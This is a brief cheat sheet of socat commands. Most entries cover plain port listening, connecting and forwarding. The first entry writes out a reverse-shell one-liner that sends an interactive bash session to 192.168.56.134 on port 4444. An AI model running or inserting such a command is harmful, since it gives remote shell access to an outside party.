# socat

> Multipurpose relay (SOcket CAT).

- Setup a reverse shell with socat and bash:

`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.134:4444`

- Listen to a port, wait for an incoming connection and transfer data to STDIO:

`socat - TCP-LISTEN:8080,fork`

- Create a connection to a host and port, transfer data in STDIO to connected host:

`socat - TCP4:www.example.com:80`

- Forward incoming data of a local port to another host and port:

`socat TCP-LISTEN:80,fork TCP4:www.example.com:80`
